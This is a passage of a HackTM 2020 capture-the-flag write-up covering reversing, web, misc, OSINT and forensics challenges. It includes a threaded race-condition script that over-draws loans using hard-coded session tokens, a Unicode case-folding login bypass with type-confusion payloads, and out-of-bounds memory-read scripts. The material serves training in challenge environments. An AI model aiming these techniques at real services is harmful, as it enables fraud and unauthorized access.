key, data = struct.unpack('<I', stream[:4])[0], bytearray(stream[4:])
decrypt(key, data, 'output.png')

```

### baby bear

The binary takes a 16-byte input and transforms it to a 46-bit string. If the resulting string matches the one generated by the binary, it prints the flag.

Instead of REing the obfuscated control flow we took a shortcut and approached this challange as a black box. We noticed that changing one input byte only affects a few consecutive output bits. We can use this to bruteforce the input byte-by-byte.

```python
from pwn import *
context.log_level = 'error'

def get(x):
    # socat tcp-l:1337,reuseaddr,fork exec:./baby_bear
    s = remote('localhost', 1337)
    s.sendlineafter('? ', x)
    r = s.recvline().strip()
    s.close()
    return r

def strdiff(a, b):
    for i in range(len(a)):
        if a[i] != b[i]:
            break
    return i

def bruteforce(t):
    s = ['\x00'] * 16
    for i in range(16):
        sc, sd = (0, 0)
        for c in range(256):
            s[i] = chr(c)
            d = strdiff(get(''.join(s)), t)
            if d > sd:
                sc = c
                sd = d
        s[i] = chr(sc)
        print 's[{}] = {}'.format(i, hex(sc))
    return ''.join(s)

s = remote('138.68.67.161', 20005)
s.recvuntil('says: ')
target = s.recvline().strip()
print 'target = {}'.format(target)

source = bruteforce(target)
s.sendafter('? ', source)
s.interactive()

```

### hackdex

1. patch the binary to bypass version number check.
2. find out we need to input 6 words and we know the sha256 hash. As the hint says, we need to pass the word game.
3. solve the word game and bruteforce with sha256 `LEARNING FUN FRIEND TEAM OVERCOMING PASSION`
4. input the 6 words and get the flag.
> HackTM{wh4t_4_cur10us_pow3r_w0rds_h4v3}


## web

### mybank

So the goal of the task was clear, to get 1337 btc in out account. The problem was that we only have ability to loan 600 btc. Some possible attacks could be:
* XML injection (of content type xml is available)
* Race condition

> So changing the content type didn't work. Now , time to test race condition. 
 
So next,I quickly wrote the following script and ran it. It tries to take 100 btc loan from server in multi thread. 
On visiting my user page i was greeted with 1500 btc in my account.I simply went to purchase page and bought the flag.

```python
import threading

import requests

def req(amount, csrf="IjA1MTk1ZjAzZWJmZTQ4YTE4OTc1NTdjM2UyNjdmMDI3MGU3NWFkOWEi.XjbIBA.oarDpyfsBinZ7v3O1TAMbPSjtWs"):

	site = "http://178.128.175.6:50090/"
	r = requests.post(site, {"csrf_token" : csrf, "loan":amount}, cookies={"session":".eJwNy00KhDAMBtC7ZD2FtPVrGi8jVRMYBkbwZyXe3b79u2k5dp_O7Wd_GokRFc7ZZrehtlhVAFmypSLOSdgEbdVGH7qu79oHco2M6qGUpmEAc1DLMaAwLPUHGD0v7K4biQ.XjbIBA.V48TChIcBrt1PEuo_kfj8s3Ukio"})
	print(r.text)


t=[
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
    threading.Thread(target=req, args=(100,)),
]

for i in t:
	i.start()

for i in t:
	i.join()

```

### Draw with us
After initial source code reviewing, I realized that the goal is to make `req.user.id == 0`  
Digging into all functions, I constucted a chain to archive that which make sense to me :))
- First bypass the check `isAdmin` in `/updateUser` so we can use it to add new right to our user. 
- Next bypass the check `checkRights` so we can add `p` and `n` to our user's rights so we can leak them using `/serverInfo`
- Finally use `/init` to get token with `id = 0`  

In the first step, i noticed that the check when we register and in `isAdmin` is while different. Specifically, `isAdmin` use `toLowerCase` but `isValidUser` use `toUpperCase`
So I think there might be some trick with `toUpperCase` and `toLowerCase`. May be something about Unicode. So I used this script to find character that can be leveraged to bypass. And I found the `\u212a` character
```js
for (let i=0; i < 100000; ++i){
    const c = String.fromCodePoint(i)
    if (c.toLowerCase() == 'k' && c.toUpperCase() !== 'K'){
        console.log(`${i} - "${c}"`)
    }
}
```
Login with `{"username":"hac\u212atm"}` give me the ability to use `/updateUser` to perform the next step.  
I stucked at this point for about 2 hours, kept searching for something useful. And I came across an example on `MDN web docs` that bring me an idea of using some object that when be converted it will be `'p'` and `'n'`. Keep in mind that we can pass some data structure like int, bool, array... when using JSON request.  
After some tries, it succesfully work with `['p']`. I submited this to `/updateUser`
```
{"rights":[["p"],["n"]]}
```
And visiting `/serverInfo` give me `n` and `p` value. Which are:
```
p = 192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617
n = 54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979
```
So now we just have to find `q` which equal `n/p`. Using sage I found its value:
```
q = 283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987
```
Submit `p` and `q` to `/init` and I got the token with `id = 0`. And using that token to request `/flag` give me the flag.  
References that I used to solve the challenge:
- [https://blog.yeswehack.com/2019/04/01/solution-for-a-weird-xss-case/](https://blog.yeswehack.com/2019/04/01/solution-for-a-weird-xss-case/)
- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Property_accessors](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Property_accessors)

## misc

### The dragon sleeps at night

We can input negative itegers which will cause our sword level to rise while in storage. 

1. Use this to upgrade our sword to level 6.
2. Work until midnight so that the dragon is asleep.
3. Go to the cave to kill the dragon and get the flag.


### Chip8_1
```
import requests


headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'http://167.172.165.153:60003',
    'Referer': 'http://167.172.165.153:60003/',
    'Accept-Encoding': 'gzip, deflate',
}



# First we clear the screen, then we store a value into register 0 using 60NN, then use register 0 to set I with F029.
# D115 is then issued to draw the data 5 bytes at a time
# So we programatically send POST requests and parse the response to obtain the flag.
for c in range(16,40):
    loc = format(c,'x').zfill(2)
    data = '{"code":"00E0\\n60'
    data += loc
    data +='\\nF029\\nd115"}'

    response = requests.post('http://167.172.165.153:60002/', headers=headers, data=data, verify=False)

    display = response.json()['data']['display']

    for i in range(0,5):
        bstr = "".join(map(str,display[i][0:8]))
        hval = hex(int(bstr,2))

        try:
            print(chr(int(hval,16))),
        except:
            pass

```
### Chip8_2
```
import requests

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'http://167.172.165.153:60003',
    'Referer': 'http://167.172.165.153:60003/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}


# We can set I to the edge of the accessible memory, then utilize the stepping feature to go past the boundary restrictions.
# The opcode / data bytes are obtained through looking at the lastInstruction & invalid instruction responses.

# This script just gets the lastInstruction values, went back manually to get the invalid instruction values when we had an illegal opcode.
ans = ""
for c in range(0,100):
    loc = format(0x1f40+(c*2),'x').zfill(2)

    #print(loc)

    data = '{"code":"'+loc+'","step":2}'

    response = requests.post('http://167.172.165.153:60002/', headers=headers, data=data, verify=False)

    bdata = response.json()['data']['lastInstruction']
    try:
        ans += chr(int(bdata[0:2],16))
    except:
        pass
    try:
        ans += chr(int(bdata[2:4],16))
    except:
        pass
    print(ans)

```

### shifty
The challenge is about solving a Torus puzzle (https://www.researchgate.net/publication/220654877_How_to_Solve_the_Torus_Puzzle). In our case the columns can only be rotated upwards, and the rows can only be rotated to the left.

By googling some possible solutions, one code caught my eye for the ease of understanding and execution speed: https://codegolf.stackexchange.com/questions/172824/rubik-sorting-a-matrix-a-k-a-the-torus-puzzle > Python solution. (Thanks Neil!)

Implementing this code to connect to the server provided by the challenge it allows to solve all the levels.

> Level 1

Simple matrix 3x3. It just takes a few seconds

> Level 2

12x12 Torus. It took forever! (Because I didn't read the hint that said "You can provide a list of comma-separated commands"). Once I read the hint twice, I solved it in a matter of seconds

> Level 3

You don't get any feedback at the end of every input. Not an issue, you just need the initial matrix to come up with the list of commands that form the solution

> Level 4

A given command will trigger a move in the wrong row / column. In order to solve it, the code needs to understand what row or column every char is connected to. Luckily enough, this is only a 4x4 matrix

> Level 5

This was the hardest. No actual way to know what row / column is connected with which character. We simply brute-forced with the code working for the levels 1-4. It took a few hours but hey, if you can't beat it.. bend it :)

### romanian_gibberish
This is the first and easiest challenge. Simply read more about Gibberish_language and how it adds noise characters to normal words to create some sort of obfuscation (Farfallino alphabet anybody?? :))
Removing the Gibberish characters from HapackTM{Wepelcopomepe_Topo_HAPACKTMCTF_2020!} gives you the flag.   
## osint

### OLD Times

> Step 1

Find the Twitter account associated to the name Vlaicu Petronel: https://twitter.com/PetronelVlaicu

> Step 2

Find the deleted tweets using **Wayback Machine** 
1. 1XhgPI0jpK8TjSMmSQ0z5Ozcu7EIIWhlXYQECJ7hFa20
2. I love GoogleS

> Step 3

Discover the Google Docs Document: https://docs.google.com/document/d/1XhgPI0jpK8TjSMmSQ0z5Ozcu7EIIWhlXYQECJ7hFa20

> Step 4

Discover the Github User: **E4gl3OfFr3ed0m** and the deleted file: **spread_locations.php** along with a secret url hidden within the README.md file: **http://138.68.67.161:55555/**

> Step 5

Get all 129 Coordinates

> Step 6

Plot all 129 Coordinates on the map

> Step 7

Get flag: **HackTM{HARDTIMES}**

## forensics


### rr
Set up both images as loop devices. On Ubuntu this will cause `mdadm` to automatically assemble a RAID array which you can then mount to get the flag.
```
root@me:~# losetup -o 1048576 $(losetup -f) 1.img
root@me:~# losetup -o 1048576 $(losetup -f) 3.img
root@me:~# ls -la /dev/md
total 0
drwxr-xr-x  2 root root   60 Feb  4 22:43 .
drwxr-xr-x 18 root root 3280 Feb  4 22:43 ..
lrwxrwxrwx  1 root root    8 Feb  4 22:43 ubuntu:0 -> ../md127
root@me:~# mount /dev/md/ubuntu:0 /mnt
root@me:~# ls -la /mnt
total 699772
drwxr-xr-x  3 root root      4096 Jan 31 20:54 .
drwxr-xr-x 18 root root      4096 Dec 18 19:57 ..
-rw-r--r--  1 root root     90402 Jan 31 20:54 Flag.jpg
drwx------  2 root root     16384 Jan 31 20:44 lost+found
-r--------  1 root root 716441107 Jan 31 20:52 realhuman_phill.txt
```

### Strange PCAP 

This is just a PCAP file when i open with wireshark i seen only a USB packets.Then i just search for the leftoverdata.
```
root@whoami:/tmp/d# tshark -r Strange.pcapng -Y "((usb.capdata)&& (frame.len == 35))"

 1332  37.973585       1.15.1 → host         USB 35 0000240000000000 URB_INTERRUPT in
 1339  37.997791       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1345  38.645921       1.15.1 → host         USB 35 0000190000000000 URB_INTERRUPT in
 1347  38.737929       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1353  39.429649       1.15.1 → host         USB 35 00000a0000000000 URB_INTERRUPT in
 1355  39.509595       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1357  40.393950       1.15.1 → host         USB 35 00000d0000000000 URB_INTERRUPT in
 1363  40.477555       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1369  42.161608       1.15.1 → host         USB 35 0000210000000000 URB_INTERRUPT in
 1371  42.241928       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1377  42.769943       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1379  43.041885       1.15.1 → host         USB 35 0200160000000000 URB_INTERRUPT in
 1381  43.173584       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1387  43.709602       1.15.1 → host         USB 35 0200160000000000 URB_INTERRUPT in
 1389  43.833597       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1391  43.865604       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1397  44.721827       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1399  45.201908       1.15.1 → host         USB 35 20000f0000000000 URB_INTERRUPT in
 1401  45.385837       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1411  46.873943       1.15.1 → host         USB 35 0000260000000000 URB_INTERRUPT in
 1413  46.961601       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1419  47.945914       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1425  49.105946       1.15.1 → host         USB 35 2000110000000000 URB_INTERRUPT in
 1427  49.237972       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1429  49.273937       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1439  50.681608       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1441  51.169930       1.15.1 → host         USB 35 20000b0000000000 URB_INTERRUPT in
 1443  51.289567       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1445  51.377598       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1451  51.665592       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1453  52.161917       1.15.1 → host         USB 35 2000190000000000 URB_INTERRUPT in
 1455  52.305610       1.15.1 → host         USB 35 2000000000000000 URB_INTERRUPT in
 1457  52.321592       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1463  53.281849       1.15.1 → host         USB 35 0000180000000000 URB_INTERRUPT in
 1465  53.353902       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1471  53.833929       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1473  54.417598       1.15.1 → host         USB 35 02000e0000000000 URB_INTERRUPT in
 1479  54.505567       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1481  54.809612       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1487  55.745945       1.15.1 → host         USB 35 0000270000000000 URB_INTERRUPT in
 1489  55.825596       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1491  56.137610       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1497  56.521610       1.15.1 → host         USB 35 0200070000000000 URB_INTERRUPT in
 1499  56.601863       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1501  56.817946       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1507  58.121930       1.15.1 → host         USB 35 0000230000000000 URB_INTERRUPT in
 1509  58.217802       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1515  58.841556       1.15.1 → host         USB 35 0000070000000000 URB_INTERRUPT in
 1517  58.929549       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1523  59.665864       1.15.1 → host         USB 35 0000200000000000 URB_INTERRUPT in
 1525  59.761612       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1527  60.049891       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1533  60.449831       1.15.1 → host         USB 35 0200090000000000 URB_INTERRUPT in
 1535  60.529594       1.15.1 → host         USB 35 0200000000000000 URB_INTERRUPT in
 1537  60.705599       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
 1543  62.409857       1.15.1 → host         USB 35 0000280000000000 URB_INTERRUPT in
 1549  62.529591       1.15.1 → host         USB 35 0000000000000000 URB_INTERRUPT in
```
I used usb key decrypt  script to decode this  leftoverdata.

here is the script.
```
#!/usr/bin/python
# coding: utf-8
from __future__ import print_function
import sys,os

#declare -A lcasekey
lcasekey = {}
#declare -A ucasekey
ucasekey = {}

#associate USB HID scan codes with keys
#ex: key 4  can be both "a" and "A", depending on if SHIFT is held down
lcasekey[4]="a";           ucasekey[4]="A"
lcasekey[5]="b";           ucasekey[5]="B"
lcasekey[6]="c";           ucasekey[6]="C"
lcasekey[7]="d";           ucasekey[7]="D"
lcasekey[8]="e";           ucasekey[8]="E"
lcasekey[9]="f";           ucasekey[9]="F"
lcasekey[10]="g";          ucasekey[10]="G"
lcasekey[11]="h";          ucasekey[11]="H"
lcasekey[12]="i";          ucasekey[12]="I"
lcasekey[13]="j";          ucasekey[13]="J"
lcasekey[14]="k";          ucasekey[14]="K"
lcasekey[15]="l";          ucasekey[15]="L"
lcasekey[16]="m";          ucasekey[16]="M"
lcasekey[17]="n";          ucasekey[17]="N"
lcasekey[18]="o";          ucasekey[18]="O"
lcasekey[19]="p";          ucasekey[19]="P"
lcasekey[20]="q";          ucasekey[20]="Q"
lcasekey[21]="r";          ucasekey[21]="R"
lcasekey[22]="s";          ucasekey[22]="S"
lcasekey[23]="t";          ucasekey[23]="T"
lcasekey[24]="u";          ucasekey[24]="U"
lcasekey[25]="v";          ucasekey[25]="V"
lcasekey[26]="w";          ucasekey[26]="W"
lcasekey[27]="x";          ucasekey[27]="X"
lcasekey[28]="y";          ucasekey[28]="Y"
lcasekey[29]="z";          ucasekey[29]="Z"
lcasekey[30]="1";          ucasekey[30]="!"
lcasekey[31]="2";          ucasekey[31]="@"
lcasekey[32]="3";          ucasekey[32]="#"
lcasekey[33]="4";          ucasekey[33]="$"
lcasekey[34]="5";          ucasekey[34]="%"
lcasekey[35]="6";          ucasekey[35]="^"
lcasekey[36]="7";          ucasekey[36]="&"
lcasekey[37]="8";          ucasekey[37]="*"
lcasekey[38]="9";          ucasekey[38]="("
lcasekey[39]="0";          ucasekey[39]=")"
lcasekey[40]="Enter";      ucasekey[40]="Enter"
lcasekey[41]="esc";        ucasekey[41]="esc"
lcasekey[42]="del";        ucasekey[42]="del"
lcasekey[43]="tab";        ucasekey[43]="tab"
lcasekey[44]="space";      ucasekey[44]="space"
lcasekey[45]="-";          ucasekey[45]="_"
lcasekey[46]="=";          ucasekey[46]="+"
lcasekey[47]="[";          ucasekey[47]="{"
lcasekey[48]="]";          ucasekey[48]="}"
lcasekey[49]="\\";         ucasekey[49]="|"
lcasekey[50]=" ";          ucasekey[50]=" "
lcasekey[51]=";";          ucasekey[51]=":"
lcasekey[52]="'";          ucasekey[52]="\""
lcasekey[53]="`";          ucasekey[53]="~"
lcasekey[54]=",";          ucasekey[54]="<"
lcasekey[55]=".";          ucasekey[55]=">"
lcasekey[56]="/";          ucasekey[56]="?"
lcasekey[57]="CapsLock";   ucasekey[57]="CapsLock"
lcasekey[79]="RightArrow"; ucasekey[79]="RightArrow"
lcasekey[80]="LeftArrow";  ucasekey[80]="LeftArrow"
lcasekey[84]="/";          ucasekey[84]="/"
lcasekey[85]="*";          ucasekey[85]="*"
lcasekey[86]="-";          ucasekey[86]="-"
lcasekey[87]="+";          ucasekey[87]="+"
lcasekey[88]="Enter";      ucasekey[88]="Enter"
lcasekey[89]="1";          ucasekey[89]="1"
lcasekey[90]="2";          ucasekey[90]="2"
lcasekey[91]="3";          ucasekey[91]="3"
lcasekey[92]="4";          ucasekey[92]="4"
lcasekey[93]="5";          ucasekey[93]="5"
lcasekey[94]="6";          ucasekey[94]="6"
lcasekey[95]="7";          ucasekey[95]="7"
lcasekey[96]="8";          ucasekey[96]="8"
lcasekey[97]="9";          ucasekey[97]="9"
lcasekey[98]="0";          ucasekey[98]="0"
lcasekey[99]=".";          ucasekey[99]="."

#make sure filename to open has been provided
if len(sys.argv) == 2:
	keycodes = open(sys.argv[1])
	for line in keycodes:
		#dump line to bytearray
		bytesArray = bytearray.fromhex(line.strip())
		#see if we have a key code
		val = int(bytesArray[2])
		if val > 3 and val < 100:
			#see if left shift or right shift was held down
			if bytesArray[0] == 0x02 or bytesArray[0] == 0x20 :
				print(ucasekey[int(bytesArray[2])], end=''),  #single line output
				#print(ucasekey[int(bytesArray[2])])            #newline output
			else:
				print(lcasekey[int(bytesArray[2])], end=''),  #single line output
				#print(lcasekey[int(bytesArray[2])])            #newline output
else:
    print("USAGE: python %s [filename]" % os.path.basename(__file__))
```    
After Decrypting i GOT this: 7vgj4SSL9NHVuK0D6d3F
Its looks like a key or password, Then i used binwalk find something
```
root@whoami:/tmp/d# binwalk Strange.pcapng 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8020775       0x7A6327        Zip archive data, encrypted at least v2.0 to extract, compressed size: 77, uncompressed size: 72, name: Flag.txt
8020980       0x7A63F4        End of Zip archive, footer length: 22
```
There is one zip file inside the pcap file i used binwalk -e Strange.pcapng to get the zip file

The zip file asking the password, I used that password as we got from usb decrypt 7vgj4SSL9NHVuK0D6d3F

I got the Flag.txt from the zip file:HackTM{88f1005c6b308c2713993af1218d8ad2ffaf3eb927a3f73dad3654dc1d00d4ae}

